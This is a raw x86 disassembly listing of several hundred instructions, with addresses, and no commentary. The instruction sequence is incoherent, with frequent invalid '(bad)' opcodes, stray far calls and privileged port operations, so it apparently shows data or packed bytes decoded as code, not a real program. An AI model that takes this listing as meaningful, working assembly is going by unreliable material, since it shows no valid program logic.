  413765:	jmp    0x7570:0x39aa6a4a
  41376c:	cmp    DWORD PTR [bx+si],eax
  41376f:	xchg   edx,eax
  413770:	retf   
  413771:	call   0x6c7248df
  413776:	jns    0x4137b5
  413778:	nop
  413779:	jecxz  0x41371e
  41377b:	scas   al,BYTE PTR es:[edi]
  41377c:	pop    esi
  41377d:	sti    
  41377e:	jne    0x413799
  413780:	sub    ebx,eax
  413782:	ins    DWORD PTR es:[edi],dx
  413783:	mov    dh,0xb2
  413785:	in     eax,0xfd
  413787:	sbb    bh,BYTE PTR [ecx-0x72ab288b]
  41378d:	ret    0xe6e2
  413790:	pop    ebp
  413791:	mov    bh,0xdd
  413793:	pop    ds
  413794:	mov    gs,ecx
  413796:	sbb    al,bh
  413798:	adc    bl,bl
  41379a:	xchg   DWORD PTR [eax],edx
  41379c:	push   esi
  41379d:	rcl    ch,0x1
  4137a0:	mov    esp,DWORD PTR [ebp+0x17024879]
  4137a6:	jl     0x4137c6
  4137a8:	push   0x5b837e89
  4137ad:	ins    BYTE PTR es:[edi],dx
  4137ae:	out    0xf6,al
  4137b0:	cmc    
  4137b1:	pop    eax
  4137b2:	push   ebp
  4137b3:	or     eax,0xfebbfd0c
  4137b8:	in     al,0x36
  4137ba:	pop    ss
  4137bb:	ret    
  4137bc:	lods   eax,DWORD PTR ds:[esi]
  4137bd:	jae    0x413822
  4137bf:	fsub   QWORD PTR [ebx+ecx*8]
  4137c2:	lods   al,BYTE PTR ds:[esi]
  4137c3:	fwait
  4137c4:	stos   DWORD PTR es:[edi],eax
  4137c5:	rol    edi,cl
  4137c7:	sbb    BYTE PTR [ecx+ecx*2-0x52],bl
  4137cb:	mov    ds:0xd48dca2f,al
  4137d0:	mov    WORD PTR [edx+0x65],es
  4137d3:	add    BYTE PTR [edx],dh
  4137d5:	aam    0x29
  4137d7:	dec    esp
  4137d8:	or     eax,0x97c5333f
  4137dd:	addr16 pop ebx
  4137df:	pop    ebx
  4137e0:	ret    
  4137e1:	pop    esi
  4137e2:	dec    esi
  4137e3:	pop    ecx
  4137e4:	loop   0x413857
  4137e6:	(bad)  
  4137e7:	stos   DWORD PTR es:[edi],eax
  4137e8:	pop    edx
  4137e9:	or     al,BYTE PTR [ecx]
  4137eb:	in     eax,dx
  4137ec:	mov    ds:0xf012b46a,eax
  4137f1:	inc    ecx
  4137f2:	sbb    al,0xfa
  4137f4:	jb     0x4137e3
  4137f6:	sub    DWORD PTR [ecx+0x6f2cbf7c],ebp
  4137fc:	pop    eax
  4137fd:	cld    
  4137fe:	int3   
  4137ff:	jg     0x41387d
  413801:	mov    ds:0xd47b739b,eax
  413806:	add    esi,DWORD PTR [esi-0x27]
  413809:	call   0x33e8c1b
  41380e:	daa    
  41380f:	jne    0x413844
  413811:	dec    eax
  413812:	sub    eax,0x76fd5ec8
  413817:	cs ins BYTE PTR es:[edi],dx
  413819:	gs cmc 
  41381b:	cmp    ebx,DWORD PTR [eax]
  41381d:	in     eax,0x46
  41381f:	dec    ebx
  413820:	in     eax,0xc8
  413822:	js     0x41380a
  413824:	mov    eax,0xbcb7f4e9
  413829:	retf   
  41382a:	aas    
  41382b:	adc    DWORD PTR [ebx+0x855877a],ebx
  413831:	popf   
  413832:	mov    cs,WORD PTR ds:0x116905d1
  413838:	xchg   ebp,eax
  413839:	xchg   edi,eax
  41383a:	sbb    cl,BYTE PTR [ebx+0x642e125a]
  413840:	mov    ebx,0x2814f836
  413845:	inc    ecx
  413846:	js     0x413899
  413848:	dec    esp
  413849:	mov    ah,0xae
  41384b:	fldenv [esi+0x2e]
  41384e:	icebp  
  41384f:	pop    eax
  413851:	mov    ebp,0xef6e9dcd
  413856:	xlat   BYTE PTR ds:[ebx]
  413857:	dec    eax
  413858:	sub    eax,0xa817807c
  41385d:	jb     0x413885
  41385f:	scas   al,BYTE PTR es:[edi]
  413860:	call   0x8caf:0xc44ba790
  413867:	lahf   
  413868:	hlt    
  413869:	add    DWORD PTR [ebp-0x35],eax
  41386c:	call   0x9bc8813c
  413871:	gs jno 0x413887
  413874:	pextrw ebp,(bad),0xc5
  413876:	push   0xbf7b698a
  41387b:	(bad)  
  41387c:	mov    dl,0x1f
  41387e:	cmp    al,0x6f
  413880:	add    DWORD PTR [ecx+esi*8],edx
  413883:	shr    ah,0x24
  413886:	pop    esp
  413887:	es ret 
  413889:	out    dx,al
  41388a:	mov    al,0xc1
  41388c:	in     eax,0x6c
  41388e:	fstp   DWORD PTR [eax-0x7b]
  413891:	leave  
  413892:	and    DWORD PTR [ecx+ecx*8],edx
  413895:	loope  0x413851
  413897:	sub    al,al
  413899:	shr    DWORD PTR [ecx],1
  41389b:	dec    ecx
  41389c:	(bad)  
  41389d:	out    0xf9,al
  41389f:	inc    esi
  4138a0:	xor    al,0x33
  4138a2:	jge    0x4138c0
  4138a4:	in     al,dx
  4138a5:	push   0x80c40845
  4138aa:	pop    ecx
  4138ab:	lahf   
  4138ac:	es mov ebp,0xeb65c0f8
  4138b2:	xchg   esp,eax
  4138b3:	fld    TBYTE PTR [ecx+0x43]
  4138b6:	call   0xcf8b:0xbc5676bc
  4138bd:	or     DWORD PTR [eax],edi
  4138bf:	imul   edi,DWORD PTR [ebx-0x6226c72b],0xffffffd3
  4138c6:	aas    
  4138c7:	mov    edx,0xe508362d
  4138cc:	cld    
  4138cd:	cmp    BYTE PTR [ecx-0x59],dh
  4138d0:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138d2:	jbe    0x4138cb
  4138d4:	pop    DWORD PTR [edi-0x3a]
  4138d7:	jo     0x413915
  4138d9:	cmp    DWORD PTR [eax-0x1b7e14e0],esp
  4138df:	jmp    FWORD PTR [edi]
  4138e1:	clc    
  4138e2:	push   0x742d33c8
  4138e7:	mov    bl,0xd
  4138e9:	imul   edi,esi,0xffffffc4
  4138ec:	dec    ebp
  4138ed:	inc    ebx
  4138ee:	xor    eax,DWORD PTR [ebx]
  4138f0:	add    edi,DWORD PTR [edi+0x1ba087c0]
  4138f6:	mov    ds:0xddbd60a,eax
  4138fb:	inc    DWORD PTR [eax-0x4b25e806]
  413901:	icebp  
  413902:	test   eax,0x3a0b0a03
  413907:	sub    dl,dl
  413909:	adc    al,0x47
  41390b:	test   DWORD PTR ds:0xfd4d4822,ecx
  413911:	pop    ecx
  413912:	and    eax,0x1e7fb218
  413917:	mov    dl,0x19
  413919:	clc    
  41391a:	stos   DWORD PTR es:[edi],eax
  41391b:	ror    BYTE PTR [edx+eiz*4],1
  41391e:	pop    ecx
  41391f:	fsub   DWORD PTR [ebp-0x191c188a]
  413925:	in     eax,dx
  413926:	xchg   DWORD PTR [eax],esi
  413928:	imul   eax,DWORD PTR [edi],0x47a34cec
  41392e:	int3   
  41392f:	rcr    BYTE PTR [eax+0x54],0x3d
  413933:	imul   ebp,DWORD PTR [ecx+0x49],0x68
  413937:	imul   esp,DWORD PTR [edi],0x5c
  41393a:	sub    ch,bh
  41393c:	stc    
  41393d:	pusha  
  41393e:	repnz in eax,dx
  413940:	pop    ss
  413941:	hlt    
  413942:	pusha  
  413943:	inc    edx
  413944:	xchg   esi,eax
  413945:	push   ds
  413946:	adc    DWORD PTR [esi+0x148839e9],ecx
  41394c:	mov    bh,0xe9
  41394e:	nop
  41394f:	push   es
  413950:	or     DWORD PTR [ecx+0x60],edx
  413953:	adc    DWORD PTR [ecx+0x44],eax
  413956:	mov    al,ds:0x9286b3e7
  41395b:	cmc    
  41395c:	sub    BYTE PTR [ecx-0x3f],dh
  41395f:	fisubr WORD PTR [esi]
  413961:	repnz sbb eax,0xa94d0ef2
  413967:	mov    ss:0x93de970,eax
  41396d:	pop    ebx
  41396e:	mov    ebx,0x4b7c65a0
  413973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413974:	pushf  
  413975:	neg    ebp
  413977:	cwde   
  413978:	int    0x75
  41397a:	je     0x413991
  41397c:	xor    eax,0x83a08b00
  413981:	add    DWORD PTR [esi-0x18],ebp
  413984:	adc    eax,0x37dc9069
  413989:	and    ax,0xd993
  41398d:	lock int3 
  41398f:	lods   eax,DWORD PTR ds:[esi]
  413990:	cmp    al,0xb4
  413992:	pop    ecx
  413993:	repnz inc ecx
  413995:	es cmc 
  413997:	push   cs
  413998:	adc    DWORD PTR [ecx+0x721b464f],0xffffffa0
  41399f:	mov    eax,ds:0x3a30c2b
  4139a4:	out    dx,al
  4139a5:	aaa    
  4139a6:	jb     0x413958
  4139a8:	and    BYTE PTR [edi],bh
  4139aa:	mov    ebp,DWORD PTR [edx+0x7da1254d]
  4139b0:	sub    edi,eax
  4139b2:	push   edx
  4139b3:	push   ss
  4139b4:	outs   dx,BYTE PTR ds:[esi]
  4139b5:	stos   BYTE PTR es:[edi],al
  4139b6:	add    eax,DWORD PTR [edx+esi*1+0x65]
  4139ba:	sar    al,1
  4139bc:	loop   0x41393e
  4139be:	mov    cl,0x1
  4139c0:	sub    DWORD PTR [edx-0x10],esp
  4139c3:	(bad)  
  4139c4:	sbb    bl,dh
  4139c6:	stc    
  4139c7:	ret    0x4160
  4139ca:	les    ecx,FWORD PTR [esp+ebp*2+0x12]
  4139ce:	lock sar DWORD PTR [ecx],1
  4139d1:	mov    al,ds:0xe082c7f7
  4139d6:	jmp    0xdd2a3e14
  4139db:	pop    ss
  4139dc:	ficom  DWORD PTR [edx-0x4d040a0c]
  4139e2:	aas    
  4139e3:	sub    bl,bl
  4139e5:	sar    al,1
  4139e7:	cmp    eax,0xd762976f
  4139ec:	rcl    BYTE PTR [ebp-0x9],1
  4139ef:	and    BYTE PTR [eax],0x69
  4139f2:	scas   al,BYTE PTR es:[edi]
  4139f3:	std    
  4139f4:	xor    al,0xd4
  4139f6:	or     al,ch
  4139f8:	xchg   esi,eax
  4139f9:	push   0xf5e2066b
  4139fe:	xchg   BYTE PTR [esi+0x25],bh
  413a01:	out    0xe6,al
  413a03:	sbb    BYTE PTR [esi-0x2e0c80c4],ch
  413a09:	adc    bh,bl
  413a0b:	sub    DWORD PTR [edx+0x32],0xb9f8cac3
  413a12:	xchg   esi,ebp
  413a14:	xor    dh,bl
  413a16:	lods   al,BYTE PTR ds:[esi]
  413a17:	xor    WORD PTR [ebx+0x21],ax
  413a1b:	xchg   esp,eax
  413a1c:	sbb    edx,DWORD PTR ds:0x596caf9f
  413a22:	lods   eax,DWORD PTR ds:[esi]
  413a23:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  413a25:	pusha  
  413a26:	scas   al,BYTE PTR es:[edi]
  413a27:	pop    esp
  413a28:	iret   
  413a29:	adc    eax,0xa9510e46
  413a2e:	dec    edi
  413a2f:	int    0x30
  413a31:	arpl   WORD PTR [edi],di
  413a33:	inc    ecx
  413a34:	xchg   BYTE PTR [ecx+0x18],al
  413a37:	cmp    eax,0x54db01a5
  413a3c:	stos   BYTE PTR es:[edi],al
  413a3d:	lods   al,BYTE PTR ds:[esi]
  413a3e:	xchg   ebp,eax
  413a3f:	xor    eax,0x4f517ab7
  413a44:	jb     0x413a42
  413a46:	ins    DWORD PTR es:[edi],dx
  413a47:	xor    esp,DWORD PTR [ebx-0x1e]
  413a4a:	imul   al
  413a4c:	push   edi
  413a4d:	iret   
  413a4e:	iret   
  413a4f:	xchg   edi,eax
  413a50:	ins    BYTE PTR es:[edi],dx
  413a51:	xor    eax,0xd2b63ff0
  413a56:	and    DWORD PTR [ebp+0x72],esi
  413a59:	inc    ecx
  413a5a:	imul   edi,edi,0x419d1a12
  413a60:	inc    edi
  413a61:	xor    BYTE PTR [edx+esi*8+0x19],0x7b
  413a66:	mov    ds:0x82b42897,al
  413a6b:	retf   
  413a6c:	inc    ebx
  413a6d:	fidiv  WORD PTR [edi]
  413a6f:	push   0xffffffa4
  413a71:	int    0xbb
  413a73:	cld    
  413a74:	jae    0x413a0b
  413a76:	add    BYTE PTR [edx-0x51db69a4],bl
  413a7c:	xchg   edi,eax
  413a7d:	aaa    
  413a7e:	in     eax,0xcf
  413a80:	add    DWORD PTR [edx+ecx*8],edx
  413a83:	sub    al,0xc2
  413a85:	inc    edi
  413a86:	or     BYTE PTR [edx-0x3f],0xa9
  413a8a:	cmp    al,0x5b
  413a8c:	daa    
  413a8d:	aad    0xee
  413a8f:	xchg   ebp,eax
  413a90:	jae    0x413a79
  413a92:	push   ecx
  413a93:	adc    eax,0xc76ba3c
  413a98:	lock sbb ah,BYTE PTR [esi+ebp*4-0x39]
  413a9d:	xor    DWORD PTR [esi+ebx*1],esi
  413aa0:	outs   dx,DWORD PTR ds:[esi]
  413aa1:	popf   
  413aa2:	int3   
  413aa3:	jge    0x413ad4
  413aa5:	(bad)
  413aa8:	push   es
  413aa9:	push   0x2bed61aa
  413aae:	sub    al,0xb2
  413ab0:	jge    0x413aa2
  413ab2:	aas    
  413ab3:	das    
  413ab4:	sbb    al,0x70
  413ab6:	sub    eax,0xe005b865
  413abb:	outs   dx,DWORD PTR ds:[esi]
  413abc:	sub    al,0xa0
  413abe:	stos   BYTE PTR es:[edi],al
  413abf:	sub    BYTE PTR [esi-0x5cdef845],dh
  413ac5:	popf   
  413ac6:	push   ds
  413ac7:	scas   eax,DWORD PTR es:[edi]
  413ac8:	ret    0x42a1
  413acb:	dec    ebx
  413acc:	(bad)  
  413acd:	adc    DWORD PTR [ebx+0x55],eax
  413ad0:	push   edi
  413ad1:	sbb    eax,0x9b3aae98
  413ad6:	or     ah,BYTE PTR [edx-0x61]
  413ad9:	sbb    cl,BYTE PTR [ecx]
  413adb:	mov    DWORD PTR [esi],esp
  413add:	clc    
  413ade:	mov    ebx,0x7b9e4dab
  413ae3:	jne    0x413ade
  413ae5:	inc    edx
  413ae6:	mov    al,0xf2
  413ae8:	mov    esp,0xadeae8cd
  413aed:	push   ds
  413aee:	inc    ebp
  413aef:	or     DWORD PTR [edx+0x47],edi
  413af2:	dec    ebp
  413af3:	xchg   dh,bh
  413af5:	mov    esp,0x850aa83a
  413afa:	aam    0x3d
  413afc:	xor    al,0x5e
  413afe:	xchg   edi,eax
  413aff:	and    al,0x46
  413b01:	imul   esp,DWORD PTR [edx],0x96a66837
  413b07:	push   cs
  413b08:	inc    esp
  413b09:	dec    ebx
  413b0a:	adc    ebp,DWORD PTR ds:0x6966a236
  413b10:	repz rdmsr 
  413b13:	stc    
  413b14:	sbb    BYTE PTR [ebx],0xd5
  413b17:	mov    ecx,0x93b74ccd
  413b1c:	sbb    eax,0x97894053
  413b21:	out    0x38,eax
  413b23:	xlat   BYTE PTR ds:[ebx]
  413b24:	adc    esp,DWORD PTR [eax]
  413b26:	push   esi
  413b27:	dec    esp
  413b28:	and    esi,edi
  413b2a:	dec    edi
  413b2b:	adc    eax,0xc2c664f4
  413b30:	fdecstp 
  413b32:	repz stc 
  413b34:	mov    ebp,0x49906a76
  413b39:	test   dl,bh
  413b3b:	add    eax,DWORD PTR [edx]
  413b3d:	daa    
  413b3e:	push   edi
  413b3f:	int    0xae
  413b41:	dec    edx
  413b42:	leave  
  413b43:	xor    DWORD PTR [ebp-0x3],ecx
  413b46:	retf   
  413b47:	stc    
  413b48:	in     al,dx
  413b49:	pop    edx
  413b4a:	ins    DWORD PTR es:[edi],dx
  413b4b:	inc    edi
  413b4c:	test   BYTE PTR [ecx+eax*2-0x7540ea4f],bl
  413b53:	std    
  413b54:	ins    DWORD PTR es:[edi],dx
  413b55:	dec    ebp
  413b56:	add    BYTE PTR [ebx-0x1c],al
  413b59:	pop    ebx
  413b5a:	pop    esi
  413b5b:	fist   DWORD PTR [esi]
  413b5d:	push   ds
  413b5e:	stos   BYTE PTR es:[edi],al
  413b5f:	cli    
  413b60:	pop    ebp
  413b61:	sbb    ecx,ebp
  413b63:	sbb    ebx,DWORD PTR [ecx+ebp*2+0x50]
  413b67:	sbb    eax,DWORD PTR [esi]
  413b69:	stc    
  413b6a:	and    eax,DWORD PTR [edi]
  413b6c:	mov    WORD PTR [eax*2-0x57942faf],?
  413b73:	sbb    BYTE PTR [ecx],dl
  413b75:	into   
  413b76:	pop    esp
  413b77:	mov    cl,0xd2
  413b79:	fisttp DWORD PTR [ebx+0x2389f533]
  413b7f:	adc    DWORD PTR [eax+0x48],esp
  413b82:	jae    0x413ba3
  413b84:	pop    es
  413b85:	(bad)  
  413b86:	(bad)  
  413b87:	fs out dx,al
  413b89:	call   0x84a5:0x5f220864
  413b90:	shl    dl,1
  413b92:	pop    esp
  413b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b94:	test   DWORD PTR ds:0x2a48758d,ebp
  413b9a:	or     ebp,DWORD PTR [ecx]
  413b9c:	or     edi,DWORD PTR [ebx-0x24d178ac]
  413ba2:	dec    edx
  413ba3:	jb     0x413c1f
  413ba5:	stos   BYTE PTR es:[edi],al
  413ba6:	adc    al,0x73
  413ba8:	jmp    DWORD PTR [ecx]
  413baa:	mov    dh,0xeb
  413bac:	inc    ebp
  413bad:	lds    ebp,FWORD PTR [eax-0x4452a712]
  413bb3:	push   ebp
  413bb4:	mov    ds:0x273f3f7e,eax
  413bb9:	out    0xd7,al
  413bbb:	mov    al,0x8f
  413bbd:	xchg   BYTE PTR [edi+0x2ee407bd],dl
  413bc3:	jbe    0x413b67
  413bc5:	jp     0x413bd5
  413bc7:	xor    BYTE PTR [edx+0x54],dl
  413bca:	jecxz  0x413bc7
  413bcc:	int3   
  413bcd:	mov    ch,0x2
  413bcf:	test   BYTE PTR [esp+ebx*4],bh
  413bd2:	stos   BYTE PTR es:[edi],al
  413bd3:	mov    bh,0x93
  413bd5:	imul   esp,DWORD PTR [ebx-0x14338d3a],0xffffffdf
  413bdc:	nop
  413bdd:	mov    al,0xb7
  413bdf:	sbb    BYTE PTR [esi+eax*1-0x56],0xb4
  413be4:	jge    0x413bcc
  413be6:	inc    ecx
  413be7:	push   edx
  413be8:	ja     0x413b85
  413bea:	mov    bh,0x8c
  413bec:	mov    ebp,0x23e7d487
  413bf1:	mov    ch,0x2e
  413bf3:	mov    ecx,edi
  413bf5:	add    al,0xb6
  413bf7:	shl    BYTE PTR [edi+eax*8+0x311a4f16],1
  413bfe:	fwait
  413bff:	mov    ds:0xb7227859,al
  413c04:	cmc    
  413c05:	push   ds
  413c06:	dec    esp
  413c07:	add    ch,cl
  413c09:	push   eax
  413c0a:	test   DWORD PTR [ecx-0x1f6b62a7],ebp
  413c10:	inc    esp
  413c11:	xchg   esi,eax
  413c12:	push   ebx
  413c13:	and    BYTE PTR [esi+0x7f],dl
  413c16:	or     DWORD PTR [edi-0x3b],edi
  413c19:	imul   esp,DWORD PTR [eax-0x1],0x42
  413c1d:	std    
  413c1e:	jno    0x413c52
  413c20:	inc    esp
  413c21:	repz call 0xa451:0xbda8fbf3
  413c29:	mov    ds:0x114cb11c,eax
  413c2e:	(bad)  
  413c2f:	sub    eax,0xb72f28bd
  413c34:	push   ecx
  413c35:	ss loop 0x413bbd
  413c38:	ins    BYTE PTR es:[edi],dx
  413c39:	inc    ebp
  413c3a:	jne    0x413c8e
  413c3c:	pop    edi
  413c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c3e:	cdq    
  413c3f:	imul   edi,DWORD PTR [edx+0x5e],0x187c1bb5
  413c46:	fistp  DWORD PTR [edx]
  413c48:	clc    
  413c49:	cmp    dh,BYTE PTR [ebp+0x5096678e]
  413c4f:	sbb    eax,0xa2a8afc3
  413c54:	or     DWORD PTR [esi+0x1cfc360e],0xd8ea75f4
  413c5e:	in     al,dx
  413c5f:	pop    ds
  413c60:	add    bl,bl
  413c62:	xor    al,0x6e
  413c64:	je     0x413c9b
  413c66:	and    ebx,eax
  413c68:	adc    eax,0xc538da5b
  413c6d:	push   0x74321930
  413c72:	ficomp WORD PTR [edx-0x16]
  413c75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c76:	call   0xa9b132d4
  413c7b:	(bad)  
  413c7c:	xor    edi,DWORD PTR ds:0x90988451
  413c82:	stos   BYTE PTR es:[edi],al
  413c83:	or     cl,0x2e
  413c86:	les    eax,FWORD PTR [eax-0x5517f86d]
  413c8c:	mov    al,ds:0xde474e72
  413c91:	lahf   
  413c92:	add    al,0xb8
  413c94:	sub    al,0xb8
  413c96:	dec    ebp
  413c97:	or     DWORD PTR [eax],edx
  413c99:	in     eax,0xf6
  413c9b:	xchg   BYTE PTR [esi+0x38],cl
  413c9e:	out    dx,al
  413c9f:	ret    0x6f04
  413ca2:	cmp    esi,DWORD PTR [edi]
  413ca4:	sub    edi,DWORD PTR [ebx-0x38cea72f]
  413caa:	push   0xdff7f864
  413caf:	inc    ecx
  413cb0:	iret   
  413cb1:	or     al,0x61
  413cb3:	repnz push ebp
  413cb5:	repnz test al,0x21
  413cb8:	das    
  413cb9:	jecxz  0x413cc1
  413cbb:	outs   dx,DWORD PTR ds:[esi]
  413cbc:	inc    esp
  413cbd:	dec    esi
  413cbe:	rcr    BYTE PTR [edx-0x5d],1
  413cc1:	jmp    0xd9d78091
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	mov    dh,0x21
  413cc9:	xchg   ebp,eax
  413cca:	int    0x6
  413ccc:	xchg   esp,eax
  413ccd:	mov    DWORD PTR [esi+0x4e51594f],esp
  413cd3:	repz adc edx,ebx
  413cd6:	mov    ds:0x4e91b1ab,al
  413cdb:	iret   
  413cdc:	popf   
  413cdd:	dec    edi
  413cde:	popa   
  413cdf:	mov    esp,DWORD PTR [edi-0x45fd8a56]
  413ce5:	jmp    0x883f:0x5eeff7e
  413cec:	dec    ebp
  413ced:	pop    ds
  413cee:	cmp    dl,BYTE PTR [edi]
  413cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cf1:	mov    edi,DWORD PTR [edi]
  413cf3:	dec    ecx
  413cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cf5:	scas   eax,DWORD PTR es:[edi]
  413cf6:	popf   
  413cf7:	pushf  
  413cf8:	out    0x66,eax
  413cfa:	test   eax,0x26e7186a
  413cff:	aaa    
  413d00:	jnp    0x413d2c
  413d02:	mov    ebx,0x65e2103c
  413d07:	dec    edx
  413d08:	in     al,0xd4
  413d0a:	add    eax,0xbae7ce6b
  413d0f:	and    BYTE PTR [edx],cl
  413d11:	cmp    eax,0x700ffab5
  413d16:	push   ecx
  413d17:	shl    esi,1
  413d19:	xchg   ebx,eax
  413d1a:	xchg   esp,eax
  413d1b:	(bad)  
  413d1c:	pop    ss
  413d1d:	dec    edi
  413d1e:	add    al,0xfe
  413d20:	push   edx
  413d21:	rol    ebx,0x5e
  413d24:	jno    0x413cdc
  413d26:	mov    ecx,0x8823c3f7
  413d2b:	add    al,0x96
  413d2d:	and    eax,0x3ef89a2d
  413d32:	and    edi,edi
  413d34:	jbe    0x413d0d
  413d36:	cmp    ah,bh
  413d38:	fidiv  WORD PTR [ebx]
  413d3a:	fld    TBYTE PTR [edi-0x6f67f4b5]
  413d40:	ins    DWORD PTR es:[edi],dx
  413d41:	std    
  413d42:	jbe    0x413d1b
  413d44:	das    
  413d45:	and    ch,BYTE PTR [ebp-0x60]
  413d48:	push   esi
  413d49:	inc    ecx
  413d4a:	mov    cl,0xc6
  413d4c:	in     eax,dx
  413d4d:	and    DWORD PTR [esi],ecx
  413d4f:	cmp    BYTE PTR [edx+0x7addc11d],al
  413d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d56:	retf   0x13b6
  413d59:	pop    edi
  413d5a:	loope  0x413da5
  413d5c:	ins    BYTE PTR es:[edi],dx
  413d5d:	or     edi,0xffffffe4
  413d60:	cwde   
  413d61:	sar    DWORD PTR [esi+0x1ca347bf],1
  413d67:	scas   eax,DWORD PTR es:[edi]
  413d68:	ins    DWORD PTR es:[edi],dx
  413d69:	data16 mov WORD PTR [ebx],fs
  413d6c:	mov    cs,WORD PTR [eax]
  413d6e:	and    al,0xf9
  413d70:	jl     0x413d6a
  413d72:	inc    ebx
  413d73:	mov    dl,0x52
  413d75:	rcr    BYTE PTR [ecx-0x4b644307],cl
  413d7b:	dec    ebp
  413d7c:	(bad)  
  413d7d:	mov    ds:0x975296c8,al
  413d82:	mov    esi,cs
  413d84:	repnz test DWORD PTR [edx+0x731dbaba],edx
  413d8b:	pusha  
  413d8c:	xchg   ebp,eax
  413d8d:	test   al,0xdc
  413d8f:	in     al,dx
  413d90:	push   edi
  413d91:	sub    al,0x2b
  413d93:	arpl   WORD PTR [edi+eax*4-0x10],sp
  413d97:	push   ebx
  413d98:	idiv   BYTE PTR [ebx-0x9]
  413d9b:	mov    ds:0x48b6c1e2,al
  413da0:	and    eax,0x5fc0cf8b
  413da5:	push   0x822b8681
  413daa:	in     al,dx
  413dab:	cli    
  413dac:	xchg   ebx,eax
  413dad:	push   0x5a
  413daf:	push   edi
  413db0:	retf   
  413db1:	(bad)  
  413db2:	cmp    al,BYTE PTR [edx+0x18bf20ca]
  413db8:	dec    edi
  413db9:	adc    eax,0x453db0db
  413dbe:	out    0x6,eax
  413dc0:	inc    ebp
  413dc1:	sbb    DWORD PTR [edx+0x4a],ecx
  413dc4:	adc    DWORD PTR [ebx],0xeb8ffb88
  413dca:	push   cs
  413dcb:	loopne 0x413de6
  413dcd:	daa    
  413dce:	cmp    bh,cl
  413dd0:	xor    edi,ebp
  413dd2:	ins    BYTE PTR es:[edi],dx
  413dd3:	mov    ch,BYTE PTR [ebp-0x79948a49]
  413dd9:	pop    edx
  413dda:	jo     0x413dc9
  413ddc:	mov    cl,0x85
  413dde:	mov    ds:0xd2c0cf2,al
  413de3:	jbe    0x413e37
  413de5:	pop    esp
  413de6:	sahf   
  413de7:	aaa    
  413de8:	imul   esp,esi,0x22
  413deb:	mov    al,BYTE PTR [edi-0x55a02752]
  413df1:	xchg   ebp,eax
  413df2:	xchg   ebx,eax
  413df3:	xor    ebp,edx
  413df5:	pop    ebx
  413df6:	add    BYTE PTR [eax+0x28d3f4d0],al
  413dfc:	pop    edi
  413dfd:	jno    0x413d95
  413dff:	fbld   TBYTE PTR [edi-0x63]
  413e02:	retf   0x45b5
  413e05:	sub    dh,ah
  413e07:	lods   eax,DWORD PTR ds:[esi]
  413e08:	shl    BYTE PTR ds:0xb8659258,1
  413e0e:	xlat   BYTE PTR ds:[ebx]
  413e0f:	std    
  413e10:	imul   ebx,DWORD PTR [esi-0x5484bee4],0x4d
  413e17:	mov    ds:0x91889f12,al
  413e1c:	jnp    0x413da2
  413e1e:	inc    edx
  413e1f:	(bad)  [ebx+ebp*2]
  413e22:	ror    dl,cl
  413e24:	and    al,0x71
  413e26:	repz cld 
  413e28:	cld    
  413e29:	lea    ebx,[ebp+0x12]
  413e2c:	sub    eax,0x2e938d74
  413e31:	shl    BYTE PTR [edx],1
  413e33:	je     0x413eab
  413e35:	aad    0x97
  413e37:	sbb    cl,bl
  413e39:	jg     0x413e1e
  413e3b:	jno    0x413e07
  413e3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e3e:	jecxz  0x413e71
  413e40:	sar    dl,cl
  413e42:	mov    ecx,DWORD PTR [esi-0x9]
  413e45:	rcl    BYTE PTR [ebp+0x60],0xaa
  413e49:	or     DWORD PTR [edi+esi*1+0x7b],ebx
  413e4d:	jns    0x413e1c
  413e4f:	psubsw mm6,QWORD PTR [esi-0x1c]
  413e53:	jp     0x413e28
  413e55:	pop    esp
  413e56:	fwait
  413e57:	repz pushf 
  413e59:	cli    
  413e5a:	(bad)  
  413e5b:	(bad)  
  413e5c:	fild   QWORD PTR [ebx]
  413e5e:	loop   0x413e78
  413e60:	xchg   ebx,eax
  413e61:	cld    
  413e62:	push   edx
  413e63:	fwait
  413e64:	loop   0x413ec5
  413e66:	mov    WORD PTR [edi],cs
  413e68:	pop    esi
  413e69:	xchg   ecx,eax
  413e6a:	or     al,0x51
  413e6c:	int    0x36
  413e6e:	cmp    eax,0x7d2d9ffc
  413e73:	push   ss
  413e74:	sub    al,0x1
  413e76:	fdiv   QWORD PTR [esi+0x6bdc91e5]
  413e7c:	sti    
  413e7d:	xchg   ebp,eax
  413e7e:	dec    ebp
  413e7f:	test   al,0xdf
  413e81:	mov    eax,0x898af324
  413e86:	adc    BYTE PTR [ebp-0xb7f7bbe],cl
  413e8c:	repz dec ebx
  413e8e:	adc    al,0x75
  413e90:	sbb    BYTE PTR [esi-0xdfc0b7f],0xa5
  413e97:	cs xor esp,eax
  413e9a:	sub    cl,BYTE PTR [ebx-0x6e5df823]
  413ea0:	pop    edx
  413ea1:	lods   eax,DWORD PTR ds:[esi]
  413ea2:	(bad)  
  413ea3:	fdivp  st(3),st
  413ea5:	stos   DWORD PTR es:[edi],eax
  413ea6:	dec    ebx
  413ea7:	push   edx
  413ea8:	ins    DWORD PTR es:[edi],dx
  413ea9:	in     eax,dx
  413eaa:	scas   eax,DWORD PTR es:[edi]
  413eab:	adc    eax,0x39b8a92c
  413eb0:	retf   
  413eb1:	test   al,0x84
  413eb3:	push   ecx
  413eb4:	aam    0x9f
  413eb6:	pop    ebx
  413eb7:	in     eax,dx
  413eb8:	fs xchg ecx,eax
  413eba:	shl    BYTE PTR [ebx],0xc1
  413ebd:	jns    0x413e50
  413ebf:	(bad)  
  413ec0:	xchg   edx,eax
  413ec1:	xchg   ebp,eax
  413ec2:	ins    DWORD PTR es:[edi],dx
  413ec3:	jg     0x413f22
  413ec5:	xlat   BYTE PTR ds:[ebx]
  413ec6:	ss and cl,BYTE PTR es:[eax-0x5c8d3f14]
  413ece:	mov    al,BYTE PTR [edi-0x68]
  413ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ed2:	neg    DWORD PTR [esi+eax*2+0x76fc4fa3]
  413ed9:	jp     0x413e96
  413edb:	daa    
